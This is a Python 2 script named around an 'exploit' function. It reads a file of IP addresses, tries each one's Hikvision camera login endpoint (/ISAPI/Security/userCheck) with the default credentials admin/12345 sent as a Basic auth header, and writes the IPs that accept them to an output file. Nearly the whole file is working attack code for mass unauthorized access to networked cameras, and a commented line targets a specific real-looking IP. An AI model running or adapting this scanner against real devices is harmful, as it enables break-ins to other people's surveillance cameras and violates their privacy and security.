# coding: utf-8
# author: Conan
# datetime: 2017/5/5

import os
import requests

# hikvision default username and password
username = 'admin'
password = '12345'

source_file = 'ip_list.txt'
destination_file = 'ip_filterd.txt'

filteredIPList = []


def exploit(ip):
    url = 'http://' + ip
    url = url.replace("\n", "")  # 去除\n
    # r = requests.get(url)
    # print r
    # 页面中j的avascript代码为ajax请求，python模拟之
    '''
    g_oCommon.m_szUserPwdValue = Base64.encode($("#loginUserName").val() + ":" + $("#loginPassword").val());
    $.ajax({
			type: "get",
			url: g_oCommon.m_lHttp + g_oCommon.m_szHostName + ":" + g_oCommon.m_lHttpPort + "/ISAPI/Security/userCheck",
			async: true,
			timeout: 15000,
			beforeSend: function(xhr) {
				xhr.setRequestHeader("If-Modified-Since", "0");
				xhr.setRequestHeader("Authorization", "Basic " + g_oCommon.m_szUserPwdValue);
			},
			success: function(xmlDoc, textStatus, xhr) {
				if("200" === $(xmlDoc).find("statusValue").eq(0).text()) {
					var szUrl = decodeURI(document.URL);
					if(szUrl.indexOf("?page=") != -1) {
						var szPage = szUrl.substring(szUrl.indexOf("page=") + 5, szUrl.indexOf("&params="));
						if(szPage.indexOf(".asp") == -1) {
							szPage = szPage.concat(".asp");
						}
						var szParam = szUrl.substring(szUrl.indexOf("&params=") + 8, szUrl.length);
						$.cookie("page", szPage + "?" + szParam + "%1");
					} else {
						$.cookie("page", null);
					}
					$.cookie("userInfo" + g_oCommon.m_lHttpPort, g_oCommon.m_szUserPwdValue);
					window.location.href = "main.asp";
				} else {
					$("#loginUserName").focus();
					$("#loginUserName").val("");
					$("#loginPassword").val("");
					alert(translator.translateNode(that._lxdLogin, "LoginTips4"));
				}
			},
			error: function(xhr, textStatus, errorThrown) {
				if("timeout" == textStatus) {
					alert(translator.translateNode(that._lxdLogin, "ConnectTimeoutTips"));
				} else {
					alert(translator.translateNode(that._lxdLogin, "NetworkErrorTips"));
				}
			}
		});	
    '''
    userpwd = 'Basic YWRtaW46MTIzNDU='  # 由username 和 password base64去=获得
    # print userpwd
    headers = {
        'X-Requested-With': 'XMLHttpRequest',
        'Refer': url + '/doc/page/login.asp',
        'If-Modified-Since': "0",
        "Authorization": userpwd
    }
    try:
        r = requests.get(url=url + '/ISAPI/Security/userCheck', headers=headers)
        #r = requests.get(url='http://218.15.164.27:80/ISAPI/Security/userCheck', headers=headers)
        print '[-] try to exploit ' + ip.replace('\n', ''),
        #print r.text
        if r.status_code == 200 and r.text.find('OK') != -1:
            print ' Succeed'
            return True
        else:
            print ' Failed'
            return False

    except Exception, e:
        return False


def saveListToFile(file, list):
    s = '\n'.join(list)
    with open(file, 'w') as output:
        output.write(s)


def filter():
    if not os.path.isfile(source_file):
        print '[-] IP source file is not exist,please put it in the current directory'
        exit()

    f = open(source_file)
    single_ip = f.readline()
    while single_ip:
        if exploit(single_ip):
            filteredIPList.append(single_ip)
        single_ip = f.readline()
    f.close()


def main():
    filter()
    saveListToFile(destination_file, filteredIPList)


if __name__ == '__main__':
    main()
